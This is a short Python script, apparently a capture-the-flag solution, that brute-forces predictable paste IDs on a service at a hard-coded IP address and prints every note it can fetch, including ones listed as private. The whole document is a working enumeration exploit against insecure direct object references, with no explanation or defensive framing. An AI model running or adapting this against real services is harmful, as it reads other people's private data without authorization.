#!/usr/bin/env python3
# coding: utf-8

import string
import requests
import time

"""
Xkva4KrqXd6tZvrT
(private)
Xkva2arqXd6tZvrP
XkvawqrqXd6tZvrH
Xkvav6rqXd6tZvrE
Xkvau6rqXd6tZvrC
Xkvat6rqXd6tZvrB
"""
def get_note(note_id):
    url = 'http://69.90.132.70:1339/paste/{0}'.format(note_id)
    r = requests.get(url)
    return r.status_code, r.text


def main():
    for a in 'xyz01234':
        for b in string.ascii_letters + '-_':
            for c in string.ascii_letters + '-_':
                note_id = 'Xkva{0}{1}rqXd6tZvr{2}'.format(a, b, c)
                status, note = get_note(note_id)
                if status == 200:
                    print(note)


if __name__ == '__main__':
    main()

